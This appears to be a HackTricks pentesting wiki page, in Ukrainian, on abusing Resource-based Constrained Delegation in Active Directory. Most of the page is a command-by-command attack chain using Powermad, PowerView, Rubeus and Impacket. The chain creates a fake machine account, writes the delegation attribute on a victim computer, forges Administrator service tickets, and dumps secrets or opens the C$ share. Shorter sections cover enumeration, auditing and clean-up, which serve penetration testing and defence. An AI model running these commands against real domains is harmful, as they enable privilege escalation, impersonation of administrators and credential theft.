# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Основи Resource-based Constrained Delegation

Це схоже на базовий [Constrained Delegation](constrained-delegation.md), але **замість** того, щоб давати дозволи **об'єкту** на **імітацію будь-якого користувача для доступу до машини**, Resource-based Constrain Delegation **встановлює** в **об'єкті, хто може імітувати будь-якого користувача щодо нього**.

У цьому випадку об'єкт з обмеженим делегуванням матиме атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з іменем користувача, який може імітувати будь-якого іншого користувача щодо нього.

Ще одна важлива відмінність між цим Constrained Delegation та іншими делегуваннями полягає в тому, що будь-який користувач з **правами запису над обліковим записом машини** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) може встановити **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (в інших формах делегування потрібні були права domain admin).

### Нові поняття

У випадку Constrained Delegation казали, що прапорець **`TrustedToAuthForDelegation`** всередині значення _userAccountControl_ користувача потрібен для виконання **S4U2Self.** Але це не зовсім правда.\
Насправді навіть без цього прапорця ви можете виконати **S4U2Self** щодо будь-якого користувача, якщо ви є **service** (маєте SPN), але якщо ви **маєте `TrustedToAuthForDelegation`**, повернений TGS буде **Forwardable**, а якщо ви **не маєте** цього прапорця, повернений TGS **не буде** **Forwardable**.

Однак якщо **TGS**, використаний у **S4U2Proxy**, **NOT Forwardable**, спроба зловживати **basic Constrain Delegation** **не спрацює**. Але якщо ви намагаєтеся експлуатувати **Resource-Based constrain delegation**, це **працюватиме**.

### Структура атаки

> Якщо ви маєте **write equivalent privileges** над обліковим записом **Computer**, ви можете отримати **privileged access** на цій машині.

Припустимо, що атакуючий вже має **write equivalent privileges over the victim computer**.

1. Атакуючий **компрометує** обліковий запис, який має **SPN**, або **створює його** (“Service A”). Зауважте, що **будь-який** _Admin User_ без інших особливих привілеїв може **створити** до 10 об'єктів Computer (**_MachineAccountQuota_**) і задати їм **SPN**. Отже атакуючий може просто створити об'єкт Computer і задати SPN.
2. Атакуючий **зловживає своїм WRITE-привілеєм** над комп'ютером-жертвою (ServiceB), щоб налаштувати **resource-based constrained delegation**, дозволивши ServiceA імітувати будь-якого користувача для доступу до того комп'ютера (ServiceB).
3. Атакуючий використовує Rubeus для виконання **full S4U attack** (S4U2Self and S4U2Proxy) від Service A до Service B для користувача **з привілейованим доступом до Service B**.
1. S4U2Self (з компрометованого/створеного облікового запису з SPN): Запитати **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Використати **not Forwardable TGS** з попереднього кроку, щоб запросити **TGS** від **Administrator** до **victim host**.
3. Навіть якщо ви використовуєте not Forwardable TGS, оскільки ви експлуатуєте Resource-based constrain delegation, це спрацює.
4. Атакуючий може **pass-the-ticket** і **імітувати** користувача, щоб отримати доступ до victim ServiceB.

Щоб перевірити _**MachineAccountQuota**_ домену, ви можете використати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені, використовуючи **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування Resource-based Constrained Delegation

**Використання activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної S4U атаки (Windows/Rubeus)

По-перше, ми створили новий Computer object з паролем `123456`, тож нам потрібен хеш цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе RC4 та AES hashes для цього облікового запису.  
Тепер можна виконати attack:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше tickets для більшої кількості сервісів, просто задавши один раз параметр `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Зверніть увагу, що у користувачів є атрибут під назвою "**Cannot be delegated**". Якщо у користувача цей атрибут встановлений у True, ви не зможете impersonate його. Це властивість видно в bloodhound.

### Інструменти Linux: повна ланка RBCD з Impacket (2024+)

Якщо ви працюєте з Linux, ви можете виконати повний ланцюг RBCD, використовуючи офіційні інструменти Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Примітки
- Якщо примусово вимагається LDAP signing/LDAPS, використовуйте `impacket-rbcd -use-ldaps ...`.
- Надавайте перевагу AES-ключам; багато сучасних доменів обмежують RC4. Impacket та Rubeus обидва підтримують AES-only потоки.
- Impacket може переписувати `sname` ("AnySPN") для деяких інструментів, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Доступ

Останній рядок команди виконає **complete S4U attack і внесе TGS** від Administrator на хост жертви в **пам'ять**.\
У цьому прикладі було запитано TGS для сервісу **CIFS** від Administrator, тож ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними service tickets

Дізнайтеся про [**доступні service tickets**](silver-ticket.md#available-services).

## Перерахування, аудит та очищення

### Перерахування комп'ютерів із налаштованою RBCD

PowerShell (декодування SD для отримання SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read або flush однією командою):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Очищення / скидання RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви передаєте лише RC4-хеш. Передайте Rubeus щонайменше AES256-хеш (або передайте rc4, aes128 і aes256-хеші). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп'ютері відрізняється від часу на DC і Kerberos працює некоректно.
- **`preauth_failed`**: Це означає, що вказане ім'я користувача + хеші не підходять для входу. Можливо, ви забули додати "$" у імені користувача під час генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтесь імітувати, не має доступу до потрібної служби (бо ви не можете його імітувати або він не має достатніх привілеїв)
- Запитувана служба не існує (наприклад, ви просите квиток для winrm, але winrm не запущено)
- Створений fakecomputer втратив свої привілеї над вразливим сервером, і вам потрібно їх відновити.
- Ви зловживаєте класичним KCD; пам'ятайте, що RBCD працює з non-forwardable S4U2Self tickets, тоді як KCD вимагає forwardable.

## Примітки, relays та альтернативи

- Ви також можете записати RBCD SD через AD Web Services (ADWS), якщо LDAP відфільтрований. Див.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Ланцюги Kerberos relay часто закінчуються RBCD, щоб отримати local SYSTEM в один крок. Див. практичні end-to-end приклади:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо LDAP signing/channel binding **відключені** і ви можете створити a machine account, інструменти на кшталт **KrbRelayUp** можуть relay-нути примусову Kerberos-аутентифікацію до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для вашого machine account в об'єкті цільового комп'ютера та одразу ж імітувати **Administrator** через S4U з поза хоста.

## Джерела

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
